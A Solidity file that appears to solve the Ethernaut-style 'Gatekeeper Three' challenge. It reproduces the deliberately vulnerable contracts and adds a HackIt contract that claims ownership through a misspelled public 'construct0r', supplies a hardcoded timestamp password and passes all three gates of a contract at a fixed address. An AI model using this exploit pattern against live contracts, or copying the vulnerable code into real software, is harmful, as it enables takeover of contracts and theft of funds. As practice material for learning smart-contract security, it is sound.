// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";

contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint256 private password = block.timestamp;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function checkPassword(uint256 _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = password;
        return false;
    }

    function trickInit() public {
        trick = address(this);
    }

    function trickyTrick() public {
        if (address(this) == msg.sender && address(this) != trick) {
            target.getAllowance(password);
        }
    }
}

contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;

    SimpleTrick public trick;
    uint256 public password = block.timestamp;

    function construct0r() public {
        console.log("calling constructor", msg.sender);
        owner = msg.sender;
    }

    modifier gateOne() {
        console.log("msg.sender", msg.sender);
        console.log("msg.origin", tx.origin);
        console.log("owner", owner);

        require(msg.sender == owner);
        require(tx.origin != owner);
        console.log("GatekeeperOne passed");
        _;
    }

    modifier gateTwo() {
        console.log("GatekeeperTwo: Accepting");
        require(allowEntrance == true);
        _;
    }

    modifier gateThree() {
        console.log("GatekeeperTwo: Accepting");
        bool a = payable(owner).send(0.001 ether);
        console.log(a);
        if (address(this).balance > 0.001 ether && a == false) {
            _;
        }
        console.log("Gate keeper theree failed");
        console.log(address(this).balance);
    }

    function getAllowance(uint256 _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
        password = block.timestamp;
    }

    function enter() public gateOne gateTwo gateThree {
        console.log("Entered");
        entrant = tx.origin;
    }

    receive() external payable {}
}

contract HackIt {
    GatekeeperThree victimContract = GatekeeperThree(payable(0xcb9e848ACD43a1D522c52C908EEE421c47Ba54D5));
    uint256 password = 0x0000000000000000000000000000000000000000000000000000000067e3b010;

    constructor() payable {}

    function destroy() public payable {
        victimContract.construct0r();
        (bool success,) = address(victimContract).call{value: 0.0011 ether}("");
        if (!success) revert("failed");
        victimContract.getAllowance(password);
        victimContract.enter();
    }
}
